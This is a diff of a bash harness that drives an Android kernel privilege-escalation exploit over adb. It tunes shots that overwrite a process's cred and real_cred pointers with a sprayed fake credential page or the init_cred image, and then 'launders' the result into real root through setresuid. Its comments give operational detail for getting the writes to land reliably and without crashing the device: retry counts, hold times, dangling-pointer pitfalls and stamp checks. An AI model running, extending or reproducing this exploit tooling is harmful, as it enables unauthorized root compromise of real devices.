@@ -20,16 +20,25 @@
 #   * The poller is PAUSED while a shot is in flight — adb is the contended
 #     resource, and the shot is what we are timing.
 #
-# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= NODRAIN= ROUNDS= CONTROL=1
+# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= NODRAIN= R5= R6= CONTROL=1
+#   SAME_VALUE= LAUNDER=
 #   NODRAIN=1 (default) skips slab_drain() — 5 waves x 400 forked children, each
 #     pause()d then SIGKILLed, at the start of every W7 invocation.  This is the
 #     single heaviest difference between the boots that rebooted and run 7 which
 #     did not, so NODRAIN=0 is the control to try next.
-#   ROUNDS=n allows up to n shots at the same offset (no kill between them, stop
-#     as soon as the readback moves).  Default 1.
+#   R5=n / R6=n — max shots for step 5 (0x778) and step 6 (0x780).  Split because
+#     the two stages have opposite risk: retrying 0x778 is SAFE (a miss installs
+#     nothing, and the stamp makes a failed round readable), while retrying 0x780
+#     is NOT (it only fires after 0x778 landed, so an extra shot is another
+#     chance to land a second, different page with no upside).  R5 defaults to
+#     ROUNDS, R6 to 1.
 #   CONTROL=1 fires the 0x778 shot with V12_ALLOW_INIT_CRED=1 (write_value = the
 #     init_cred image).  It REPLACES the normal shot; run it as its own boot, and
 #     only after a boot in which a sprayed-page write LANDED and did not reboot.
+#     ⚠ It is NOT the recommended path for a launder run: writing the init_cred
+#     pointer corrupts init_cred+8 GLOBALLY (that is what `Uid: 0 0 4294967176 0`
+#     is), so it puts a framework-wide fault in the background of the very thing
+#     being measured.  Kept as the only PROVEN consistent pair, and as a control.
 set -u
 export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"
 
@@ -51,7 +60,9 @@ RES=$DEV/bootA_res_$TAG.txt
 # 0x778 landed, 0 = anything else.  See the note at step 7.
 SV_FILE=$DEV/bootA_samevalue_$TAG
 OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
-HOLD=${HOLD:-20}
+# HOLD is deliberately left unset here and resolved after SAME_VALUE below: its
+# safe value depends on whether the two shots must share one page.
+HOLD=${HOLD:-}
 # CHAINWAIT: the proven value is 6000 ms (tools/t5loop.sh CW=6000).  The code
 # default is 20000 ms.  4000 was tried for speed and is BELOW anything that has
 # ever landed — the chain simply has not finished, which shows up as
@@ -59,12 +70,39 @@ HOLD=${HOLD:-20}
 CHAINWAIT=${CHAINWAIT:-6000}
 NODRAIN=${NODRAIN:-1}
 ROUNDS=${ROUNDS:-1}
+# R5/R6 split ROUNDS per stage, because the two stages have opposite risk
+# profiles and must not be retried symmetrically:
+#   R5 (step 5, 0x778) — retries are SAFE.  A miss leaves nothing installed, so
+#     another shot is just another attempt; and with the stamp criterion a failed
+#     round is readable, which is what makes retrying worth a boot.  Hit rate for
+#     one shot is ~p, so R5=3 buys roughly 1-(1-p)^3.
+#   R6 (step 6, 0x780) — retries are NOT safe and are not needed.  Step 6 only
+#     fires after step 5 landed, so a retry here means shooting at a task that is
+#     already divergent: each extra shot is another chance to land a SECOND,
+#     different page and there is no upside, because one landing completes the
+#     pair.  Keep it at 1.
+R5=${R5:-$ROUNDS}
+R6=${R6:-1}
 CONTROL=${CONTROL:-0}
 # SAME_VALUE=1 (default): step 6 reuses step 5's observed write value, so both
 #   cred pointers can end up equal.  SAME_VALUE=0 restores the old behaviour
 #   (each shot sprays its own page -> divergent pair).  Only use 0 to reproduce
 #   a historical run.
 SAME_VALUE=${SAME_VALUE:-1}
+
+# ★ HOLD's default depends on SAME_VALUE, and getting it wrong is a SILENT
+# corruption rather than a failure:
+#   SAME_VALUE=1 — step 6 writes step 5's page ADDRESS.  That address is only
+#     still meaningful while step 5's PIN child is alive holding the payload
+#     page.  If the page is freed and reallocated first, "same value" quietly
+#     becomes a DANGLING POINTER: both cred slots get filled with one address
+#     that now belongs to something else, and every log line still says "same
+#     value".  The old default of 20 s is shorter than the gap to the second
+#     shot, i.e. the DEFAULT configuration was the trap.
+#   SAME_VALUE=0 — each shot sprays its own page, nothing needs to outlive
+#     anything, and 20 s is fine.
+# Resolved right after say() is defined (below) so the warning can use it.
+
 # LAUNDER=1: after the poke, the LT child issues setgroups(0,NULL) +
 #   setresgid(0,0,0) + setresuid(0,0,0) to replace the fake cred with a real one.
 #   ★ It REFUSES unless the same-value provenance is declared, because
@@ -84,6 +122,20 @@ mkdir -p "$OUT" || { echo "cannot create $OUT"; exit 1; }
 A() { "$ADB" -s "$SER" shell "$@"; }
 say() { echo "[$(date +%H:%M:%S)] $*"; }
 detach() { timeout 15 "$ADB" -s "$SER" shell "$1" >/dev/null 2>&1 || true; }
+
+# ---- HOLD: resolved here because the warning needs say() (defined just above).
+# See the note next to SAME_VALUE for why the default is conditional: with the
+# same-value rule on, a short HOLD does not fail, it turns the second shot into a
+# write of a dangling pointer while every log line still says "same value".
+if [ -z "$HOLD" ]; then
+    if [ "${SAME_VALUE}" != "0" ]; then HOLD=600; else HOLD=20; fi
+elif [ "${SAME_VALUE}" != "0" ] && [ "$HOLD" -lt 180 ] 2>/dev/null; then
+    say "  ⚠⚠ HOLD=${HOLD}s with SAME_VALUE=1: step 5's PIN child may release the"
+    say "     payload page before step 6 writes its address.  That does not fail —"
+    say "     it silently turns 'same value' into a DANGLING POINTER, and every log"
+    say "     line still reads 'same value'.  Use HOLD>=600 unless you are"
+    say "     deliberately reproducing a historical short-HOLD run."
+fi
 uid_line() { A "grep -m1 '^Uid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
 gid_line() { A "grep -m1 '^Gid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
 now_ms() { local v; v=$(date +%s%3N 2>/dev/null); case "$v" in ''|*[!0-9]*) date +%s;; *) echo "$v";; esac; }
@@ -136,6 +188,37 @@ now_ms() { local v; v=$(date +%s%3N 2>/dev/null); case "$v" in ''|*[!0-9]*) date
 #     uses.  A self-test that re-implements the check proves nothing.
 uid_suid_field() { printf '%s' "$1" | awk '{print $4}'; }   # 4th awk field == suid
 gid_gid_field()  { printf '%s' "$1" | awk '{print $2}'; }   # 2nd awk field == gid
+
+# ★ "which page got installed" — extracted from the evidence file, and the reason
+# this is a function rather than an inline sed.
+#
+# The runner used to match the spray path's wording:
+#     `W7[..] write value = private cred page 0x..`      (space, "value")
+# but run_w7 prints TWO different lines and only one of them is unconditional
+# (exploit.c):
+#     L1793  `write value = private cred page 0x..`   — spray path only
+#     L1802  `write_value = 0x..`                     — AFTER the if/else, all paths
+# So on CONTROL=1 (V12_ALLOW_INIT_CRED=1) the old extraction matched nothing,
+# CRED came back empty, and `if [ -n "$CRED" ]` skipped the repair entirely —
+# leaving the global init_cred+8 corrupted — while the SV conjunction's own
+# `[ -n "$CRED" ]` term made SV=0, so V12_LAUNDER refused.  A silent no-op on
+# both counts, from a regex that only recognised one of two print sites.
+#
+# ⚠ `write_value` also appears on other tags (W2/W6/LTC).  Within a single W7
+# evidence file there is exactly one, which is what makes `tail -1` correct for
+# a one-file read; keep the caller's glob narrow (w7_w780*.txt) for that reason.
+wv_from() {   # $@ = evidence file(s) -> the LAST `write_value = 0x...`
+    sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' "$@" 2>/dev/null | tail -1
+}
+
+# Same shape, same reason: `write_target` is printed once per W7 run on the
+# unconditional line (exploit.c L1803, next to write_value) and it is the INPUT
+# to the stamp criterion -- cred.gid = low32(target), cred.suid = hi32(target).
+# If this extraction goes wrong, stamp_ok is fed a wrong target and reports
+# "no stamp" for a landed shot, i.e. the same silent no-op.
+wt_from() {   # $@ = evidence file(s) -> the LAST `write_target= 0x...`
+    sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$@" 2>/dev/null | tail -1
+}
 
 # THREE states, because "cannot read" is not "no stamp".  Collapsing those two is
 # the same error as run 13's blank probe_state (铁律 8) and it cost this project a
@@ -465,7 +548,7 @@ shot() {
     # whole shot (including a 45 s adb evidence read), which is how run 10 lost
     # the one line that would have settled three things at once.
     SHOT_STATUS=$(uid_line "$CPID")
-    SHOT_WT=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
+    SHOT_WT=$(wt_from "$OUT/w7_$tag.txt")
     say "  [$tag] victim readback NOW: [$SHOT_STATUS]"
     # SKIP_PRED: is the target really task+0x778?  The prediction below is only
     # meaningful then, and it is the only line that says what the readback SHOULD
@@ -492,7 +575,7 @@ shot() {
         say "  [$tag] if 0x778 LANDED the side effect puts write_target at cred+8, so"
         say "  [$tag] /proc/status must read:  Uid: 0 0 $hi 0   and   Gid first field = $lo"
     fi
-    SHOT_CRED=$(printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
+    SHOT_CRED=$(wv_from "$OUT/w7_$tag.txt")
     [ -z "$SHOT_PS" ] && SHOT_PS=UNKNOWN
     say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked, UNKNOWN=no data)"
     return 0
@@ -588,12 +671,12 @@ V778=""
 W778_LANDED=0
 if [ "$CONTROL" = "1" ]; then
     say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
-    if shot_until 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl "$ROUNDS"; then W778_LANDED=1; fi
+    if shot_until 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl "$R5"; then W778_LANDED=1; fi
     # Same value again for the second slot -- this is exactly cell 2.
     V778="V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1"
     say "  [same-value] step 6 will reuse the init_cred image (cell-2 reproduction)"
 else
-    if shot_until 0x778 "" w778 "$ROUNDS"; then W778_LANDED=1; fi
+    if shot_until 0x778 "" w778 "$R5"; then W778_LANDED=1; fi
     # ⚠ INVARIANT, do not break it silently: `tail -1` takes the LAST round's
     # write_value, which equals "the round that SUCCEEDED" only because
     # shot_until returns the moment the stamp appears (so a success is always the
@@ -602,8 +685,7 @@ else
     # value and step 6 then writes a different page while every log line still
     # says "same value".  Any such change must select the successful round
     # explicitly instead.
-    V778="V12_W7_VALUE=$(sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' \
-            "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)"
+    V778="V12_W7_VALUE=$(wv_from "$OUT"/w7_w778*.txt)"
     case "$V778" in
         *"V12_W7_VALUE=0x"*)
             say "  [same-value] step 6 will reuse $V778"
@@ -627,7 +709,7 @@ say "  after 0x778: [$U778] / [$G778]"
 #   断言写在了只有判据正确时才会执行的位置，等于没写。判据修好后它才真正跑起来。
 STAMP_VERIFIED=0
 if [ "$W778_LANDED" = "1" ]; then
-    WT778=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)
+    WT778=$(wt_from "$OUT"/w7_w778*.txt)
     stamp_ok "$CPID" "$WT778"; rc=$?
     case $rc in
     0)  say "  [stamp] ASSERTION HOLDS: Uid \$4 = $(( WT778 >> 32 & 0xffffffff )), Gid \$2 = $(( WT778 & 0xffffffff ))"
@@ -657,12 +739,14 @@ elif [ "$W778_LANDED" != "1" ] && [ "${SAME_VALUE:-1}" != "0" ]; then
     say "  ✗ step 6 SKIPPED: 0x778 did NOT land, so there is nothing to make equal."
     say "    A lone 0x780 landing leaves real_cred != cred — a divergent pair, i.e. a"
     say "    latent hard BUG_ON — and buys nothing.  Not fired."
-    say "    (Set ROUNDS>1 to retry 0x778 within this boot: the stamp criterion is"
+    say "    (Set R5>1 to retry 0x778 within this boot: the stamp criterion is"
     say "     what makes a retry meaningful, since a failed round is now readable.)"
-elif shot_until 0x780 "$V778" w780 "$ROUNDS"; then
+elif shot_until 0x780 "$V778" w780 "$R6"; then
     say "  after 0x780: [$(uid_line "$CPID")]"
-    CRED=$(grep -h -m1 'write value = private cred page' "$OUT"/w7_w780*.txt 2>/dev/null \
-           | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
+    # ★ Read the page that was ACTUALLY installed, via the unconditional line, so
+    # this also works on CONTROL=1 (see wv_from).  Same-value runs make this equal
+    # to step 5's value; the assertion below still checks that it is.
+    CRED=$(wv_from "$OUT"/w7_w780*.txt)
 else
     say "  ✗ 0x780 did not move the readback — SKIPPING the repair."
     say "    The repair only exists to clear cred+8 of the cred that was actually"
@@ -670,7 +754,7 @@ else
     say "    (Run 7 burned 86 s on exactly that.)"
 fi
 
-V5=$(sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)
+V5=$(wv_from "$OUT"/w7_w778*.txt)
 if [ -n "$CRED" ]; then
     # ★ 一次 boot 只修一个页。SAME_VALUE=1 时两枪同值 ⇒ 只有一张页被装上，一次
     # repair 就够。若两枪值不同，两张页的 +8 都会被清零 ⇒ 那枚戳（gid/suid）被
